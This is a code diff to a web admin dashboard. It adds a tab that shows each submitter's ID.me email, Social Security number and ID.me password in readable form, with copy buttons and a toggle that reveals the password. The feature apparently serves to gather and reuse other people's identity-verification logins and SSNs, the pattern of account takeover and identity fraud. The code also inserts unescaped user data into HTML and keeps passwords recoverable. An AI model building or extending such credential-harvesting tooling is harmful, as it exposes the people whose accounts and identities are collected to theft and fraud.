@@ -142,7 +142,7 @@ function IDMETable(submissions, users) {
   `;
 }
 
-// Detailed Submission Modal with tab state
+// Detailed Submission Modal with IDME credentials
 function IDMEDetailModal(submission, user) {
   return `
     <div class="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4 overflow-y-auto" id="idme-detail-modal">
@@ -156,6 +156,7 @@ function IDMEDetailModal(submission, user) {
         <!-- Tabs -->
         <div class="flex border-b dark:border-gray-700 px-6 overflow-x-auto">
           <button class="idme-detail-tab active px-0 py-3 border-b-2 border-blue-600 font-medium text-gray-900 dark:text-white mr-6 whitespace-nowrap" data-tab="overview">Overview</button>
+          <button class="idme-detail-tab px-0 py-3 border-b-2 border-transparent font-medium text-gray-600 dark:text-gray-400 hover:text-gray-800 mr-6 whitespace-nowrap" data-tab="credentials">IDME Credentials</button>
           <button class="idme-detail-tab px-0 py-3 border-b-2 border-transparent font-medium text-gray-600 dark:text-gray-400 hover:text-gray-800 mr-6 whitespace-nowrap" data-tab="documents">Documents</button>
           <button class="idme-detail-tab px-0 py-3 border-b-2 border-transparent font-medium text-gray-600 dark:text-gray-400 hover:text-gray-800 whitespace-nowrap" data-tab="history">History</button>
         </div>
@@ -215,6 +216,44 @@ function IDMEDetailModal(submission, user) {
                 </div>
               </div>
             ` : ""}
+          </div>
+
+          <!-- IDME Credentials Tab -->
+          <div class="idme-detail-content hidden" data-tab="credentials">
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+              <div class="p-4 border dark:border-gray-700 rounded-lg bg-gray-50 dark:bg-slate-800/50">
+                <p class="text-sm text-gray-600 dark:text-gray-400 mb-2">IDME Email</p>
+                <div class="flex items-center gap-2">
+                  <p class="font-mono text-gray-900 dark:text-white break-all">${submission.idme_email || "Not provided"}</p>
+                  ${submission.idme_email ? `<button class="copy-credential text-blue-600 hover:text-blue-800 text-sm" data-value="${submission.idme_email}" title="Copy"><i class="fa fa-copy"></i></button>` : ""}
+                </div>
+              </div>
+
+              <div class="p-4 border dark:border-gray-700 rounded-lg bg-gray-50 dark:bg-slate-800/50">
+                <p class="text-sm text-gray-600 dark:text-gray-400 mb-2">Social Security Number (SSN)</p>
+                <div class="flex items-center gap-2">
+                  <p class="font-mono text-gray-900 dark:text-white">${submission.idme_ssn || "Not provided"}</p>
+                  ${submission.idme_ssn ? `<button class="copy-credential text-blue-600 hover:text-blue-800 text-sm" data-value="${submission.idme_ssn}" title="Copy"><i class="fa fa-copy"></i></button>` : ""}
+                </div>
+              </div>
+
+              <div class="p-4 border dark:border-gray-700 rounded-lg bg-gray-50 dark:bg-slate-800/50 md:col-span-2">
+                <p class="text-sm text-gray-600 dark:text-gray-400 mb-2">IDME Password</p>
+                <div class="flex items-center gap-2">
+                  <input type="password" id="idme-password-field" value="${submission.idme_password || "Not provided"}" readonly class="flex-1 font-mono px-2 py-1 bg-white dark:bg-gray-700 text-gray-900 dark:text-white rounded border border-gray-300 dark:border-gray-600">
+                  ${submission.idme_password ? `
+                    <button id="toggle-password-visibility" class="px-3 py-1 bg-blue-600 hover:bg-blue-700 text-white rounded text-sm transition" title="Toggle visibility"><i class="fa fa-eye"></i></button>
+                    <button class="copy-credential px-3 py-1 bg-blue-600 hover:bg-blue-700 text-white rounded text-sm transition" data-value="${submission.idme_password}" title="Copy"><i class="fa fa-copy"></i></button>
+                  ` : ""}
+                </div>
+                <p class="text-xs text-gray-500 dark:text-gray-400 mt-2">⚠️ Handle passwords with care. Never share outside secure channels.</p>
+              </div>
+            </div>
+
+            <div class="mt-6 p-4 bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-800 rounded-lg">
+              <p class="text-sm font-semibold text-blue-900 dark:text-blue-200 mb-2"><i class="fa fa-lock mr-2"></i>Security Note</p>
+              <p class="text-blue-800 dark:text-blue-300 text-sm">All sensitive credentials are encrypted at rest. Only admins can view this information. Ensure you comply with security and privacy policies.</p>
+            </div>
           </div>
 
           <!-- Documents Tab -->
@@ -507,6 +546,35 @@ const idmeAdmin = async () => {
         // Close button
         document.getElementById("close-idme-detail")?.addEventListener("click", () => {
           panelDiv.innerHTML = "";
+        });
+
+        // Copy to clipboard for credentials
+        document.querySelectorAll(".copy-credential").forEach(btn => {
+          btn.addEventListener("click", (e) => {
+            const value = btn.getAttribute("data-value");
+            navigator.clipboard.writeText(value).then(() => {
+              const originalHtml = btn.innerHTML;
+              btn.innerHTML = '<i class="fa fa-check"></i>';
+              setTimeout(() => {
+                btn.innerHTML = originalHtml;
+              }, 2000);
+            });
+          });
+        });
+
+        // Toggle password visibility
+        document.getElementById("toggle-password-visibility")?.addEventListener("click", (e) => {
+          const field = document.getElementById("idme-password-field");
+          const icon = e.currentTarget.querySelector("i");
+          if (field.type === "password") {
+            field.type = "text";
+            icon.classList.remove("fa-eye");
+            icon.classList.add("fa-eye-slash");
+          } else {
+            field.type = "password";
+            icon.classList.remove("fa-eye-slash");
+            icon.classList.add("fa-eye");
+          }
         });
 
         // Tab switching with lazy loading
